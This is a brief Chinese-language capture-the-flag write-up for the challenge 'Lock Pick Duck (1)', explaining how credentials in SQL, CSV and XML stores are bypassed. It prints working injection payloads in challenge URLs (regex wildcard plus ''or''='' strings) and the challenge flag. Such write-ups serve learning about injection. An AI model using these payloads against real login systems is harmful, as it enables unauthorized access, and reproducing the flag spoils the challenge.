# Lock Pick Duck (1)

這題的話，他有`sqldb`, `csvdb`, `xmldb`

然後一開始會隨機產生一堆帳號密碼存進去這些db

接著會讀我們輸入的username, password

有滿足到他的條件就`$flag++`

只要`$flag>=3`最後就會噴第一把FLAG，`$flag==6`就會噴第二把

這邊其實前三個條件都蠻容易的，就是正規表達式可控, SQL Injection, Xpath Injection之類的

最後我的Payload:

`http://trick.fflm.ml/?username=(.*)|'or''='&password=(.*)|'or''=' `

也可以這樣 ` http://trick.fflm.ml/?username=.*&password=.*|'or''='`

FLAG: `vxctf{y0u_d0_kn0w_InjectI0n_101}`
